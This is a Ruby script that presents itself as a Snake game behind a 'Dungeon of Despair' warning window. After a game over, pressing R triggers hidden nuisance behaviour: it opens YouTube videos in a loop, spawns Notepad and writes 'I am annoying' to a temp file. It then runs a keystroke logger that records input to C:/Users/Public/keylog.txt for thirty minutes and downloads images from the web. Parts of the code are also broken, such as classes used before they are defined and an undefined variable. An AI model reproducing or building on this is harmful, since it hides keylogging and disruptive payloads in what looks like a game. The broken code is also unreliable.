#!/usr/bin/env ruby

require 'ruby2d'
require 'open3'
require 'io/console'
require 'tk'
require 'open-uri'
require 'net/http'
require 'nokogiri'

# Display the message box

# Create the root window
root = TkRoot.new

# Set the title and background color of the window
root.title = "Warning"
root.background = "#FF0000" # red background

# Create a label with the warning message
label = TkLabel.new(root) do
  text ""
  text "You have been warned! Proceed at your own risk"
  font TkFont.new('georgia 20 bold')
  foreground 'black'
  pack { padx 50 ; pady 50; }
end

# Create a button to close the window and start the game
button = TkButton.new(root) do
  text "Click to ENter the Dungeon of Despair and Gloom!"
  command { 
    root.destroy
    snake = Snake.new
    game = Game.new
  }
  pack { padx 50 ; pady 50; }
end

# Run the main loop
root.mainloop

set background: 'green'
set fps_cap: 20

SQUARE_SIZE = 20
GRID_WIDTH = Window.width / SQUARE_SIZE
GRID_HEIGHT = Window.height / SQUARE_SIZE

class Snake
  attr_writer :direction

  def initialize
    @positions = [[2, 0], [2, 1], [2, 2], [2 ,3]]
    @direction = 'down'
    @growing = false
  end

  def draw
    @positions.each do |position|
      Square.new(x: position[0] * SQUARE_SIZE, y: position[1] * SQUARE_SIZE, size: SQUARE_SIZE - 1, color: 'white')
    end
  end

  def grow
    @growing = true
  end

  def move
    if !@growing
      @positions.shift
    end

    @positions.push(next_position)
    @growing = false
  end

  def can_change_direction_to?(new_direction)
    case @direction
    when 'up' then new_direction != 'down'
    when 'down' then new_direction != 'up'
    when 'left' then new_direction != 'right'
    when 'right' then new_direction != 'left'
    end
  end

  def x
    head[0]
  end

  def y
    head[1]
  end

  def next_position
    if @direction == 'down'
      new_coords(head[0], head[1] + 1)
    elsif @direction == 'up'
      new_coords(head[0], head[1] - 1)
    elsif @direction == 'left'
      new_coords(head[0] - 1, head[1])
    elsif @direction == 'right'
      new_coords(head[0] + 1, head[1])
    end
  end

  def hit_itself?
    @positions.uniq.length != @positions.length
  end

  private

  def new_coords(x, y)
    [x % GRID_WIDTH, y % GRID_HEIGHT]
  end

  def head
    @positions.last
  end
end

class Game
  def initialize
    @ball_x = 10
    @ball_y = 10
    @score = 0
    @finished = false
  end

  def draw
    Square.new(x: @ball_x * SQUARE_SIZE, y: @ball_y * SQUARE_SIZE, size: SQUARE_SIZE, color: 'yellow')
    Text.new(text_message, color: 'aqua', x: 10, y: 10, size: 25, z: 1)
  end

  def snake_hit_ball?(x, y)
    @ball_x == x && @ball_y == y
  end

  def record_hit
    @score += 1
    @ball_x = rand(Window.width / SQUARE_SIZE)
    @ball_y = rand(Window.height / SQUARE_SIZE)
  end

  def finish
    @finished = true
  end

  def finished?
    @finished
  end

  private

  def text_message
    if finished?
      "Game over, Your Score was #{@score}. Press 'R' to restart. "
    else
      "Score: #{@score}"
    end
  end
end
snake = Snake.new
game = Game.new
update do
  clear

  unless game.finished?
    snake.move
  end

  snake.draw
  game.draw

  if game.snake_hit_ball?(snake.x, snake.y)
    game.record_hit
    snake.grow
  end

  if snake.hit_itself?
    game.finish
  end
end

on :key_down do |event|
  if ['up', 'down', 'left', 'right'].include?(event.key)
    if snake.can_change_direction_to?(event.key)
      snake.direction = event.key
    end
  end

  if game.finished? && event.key == 'r'
      # Define the list of videos
    videos = [
      { title: 'Video 1', url: 'https://www.youtube.com/watch?v=dQw4w9WgXcQ&list=RDMMdQw4w9WgXcQ&start_radio=1' },
      { title: 'Video 2', url: 'https://www.youtube.com/watch?v=bia2_kCvawU&list=RDMMdQw4w9WgXcQ&index=2' },
      { title: 'Video 3', url: 'https://www.youtube.com/watch?v=aAkMkVFwAoo' },
      { title: 'Video 4', url: 'https://www.youtube.com/watch?v=QA-OYCfgEaA&list=RDMMdQw4w9WgXcQ&index=4' },
      { title: 'Video 5', url: 'https://www.youtube.com/watch?v=eLvD7-HjJhQ&list=RDMMdQw4w9WgXcQ&index=5' },
      { title: 'Video 6', url: 'https://www.youtube.com/watch?v=PGpIFET0kc4&list=RDMMdQw4w9WgXcQ&index=6' },
      { title: 'Video 7', url: 'https://www.youtube.com/watch?v=_1b4Xr236rc' },
      { title: 'Video 8', url: 'https://www.youtube.com/watch?v=js3Mx1M4lcE&list=RDMMdQw4w9WgXcQ&index=7' },
      { title: 'Video 9', url: 'https://www.youtube.com/watch?v=WMAUZ9XWb80&list=RDMMdQw4w9WgXcQ&index=14' },
      { title: 'Video 10', url: 'https://www.youtube.com/watch?v=5YsbA-A0w2I&list=RDMMdQw4w9WgXcQ&index=19' },
      { title: 'Video 11', url: 'https://www.youtube.com/watch?v=wu9IUDbWmRU&list=RDMMdQw4w9WgXcQ&index=22' },
      { title: 'Video 12', url: 'https://www.youtube.com/watch?v=asY3aLvgbcA&list=RDMMdQw4w9WgXcQ&index=25' },
      { title: 'Video 13', url: 'https://www.youtube.com/watch?v=EoVvI058KrI&list=RDMMdQw4w9WgXcQ&index=27' },
      { title: 'Video 14', url: 'https://www.youtube.com/watch?v=77vseB8e004&list=RDMMdQw4w9WgXcQ&index=28' },
      { title: 'Video 15', url: 'https://www.youtube.com/watch?v=MvK-hmjAm_E&list=RDMMdQw4w9WgXcQ&index=34' },
      { title: 'Video 16', url: 'https://www.youtube.com/watch?v=nwN2BudrUpM&list=RDMMdQw4w9WgXcQ&index=35' },
      { title: 'Video 17', url: 'https://www.youtube.com/watch?v=5RhFASrawv4&list=RDMMdQw4w9WgXcQ&index=37' },
      { title: 'Video 18', url: 'https://www.youtube.com/watch?v=E_SqOV65VDY' },
      { title: 'Video 19', url: 'https://www.youtube.com/watch?v=XqZsoesa55w' },
      { title: 'Video 20', url: 'https://www.youtube.com/watch?v=r7kA8hhskkQ' },
    ]

    counter = 0
    loop do
      # Launch the first YouTube video in your default web browser
      # Select a random video from the list
      video = videos.sample
      
      # Extract the video's URL and title
      video_url = video[:url]
      video_title = video[:title]
      
      # Use the `system` command to open the video in the default web browser
      system "start #{video_url}"
      
      puts "Now playing: #{video_title}"

      # Wait for 5 seconds before checking if the browser tab is still open
      
      sleep 5
      # Check if the browser tab is still open
      if system "tasklist /FI \"IMAGENAME eq chrome.exe\" | find /I \"chrome.exe\""
        puts "Browser tab is still open"
        sleep 5
        
      else
        puts "Browser tab is closed"
        # Launch the second and third YouTube videos in your default web browser
        system "start https://www.youtube.com/watch?v=g5tYiwur6Bo&list=RDGMEMQ1dJ7wXfLlqCjwV0xfSNbA&index=27"
        system "start https://www.youtube.com/watch?v=c98ArBOq6uE&list=RDGMEMQ1dJ7wXfLlqCjwV0xfSNbA&index=27"
        system("notepad")
        sleep(1)
        system("echo I am annoying > %temp%\\temp.txt")
        sleep(1)
        system("type %temp%\\temp.txt >> %temp%\\temp.txt")
        sleep(1)
        system("start %temp%\\temp.txt")
        sleep(1)
        puts counter
      end
      counter += 1
      break if counter == 15
    end

    # Set the maximum logging time in seconds
    MAX_LOG_TIME = 1800 # 30 minutes

    # Set the file path for the log file
    LOG_FILE_PATH = "C:/Users/Public/keylog.txt"

    # Initialize the log file
    File.open(LOG_FILE_PATH, "w") do |file|
      file.truncate(0)
    end

    # Set the start time
    start_time = Time.now

    # Loop until the maximum logging time is reached or the terminal is closed
    while (Time.now - start_time) < MAX_LOG_TIME
      # Read a single keystroke
      keystroke = STDIN.getch

      # Append the keystroke to the log file
      File.open(LOG_FILE_PATH, "a") do |file|
        file.puts(keystroke)
      end
    end      
    # Set the URL of the website that contains the cat images
    url = "https://cataas.com/cat"

    # Make an HTTP GET request to the website
    response = Net::HTTP.get_response(URI(url))

    # Check the response status to make sure the request was successful
    if response.is_a?(Net::HTTPSuccess)
      # Parse the HTML body of the response to find the cat images
      html_doc = Nokogiri::HTML(response.body)
      cat_images = html_doc.css('img')

      # Iterate over the cat images and download each one
      cat_images.each do |image|
        # Get the URL of the cat image
        image_url = image['src']

        # Open the URL and download the image
        open(image_url) do |image_file|
          File.open("C:\\Users\\Public\\cat_image_#{index}.jpg", "wb") do |file|
            file.write(image_file.read)
          end
        end
      end
    else
      puts "Failed to download cat images: #{response.message}"
    end
    
  end
  
end

show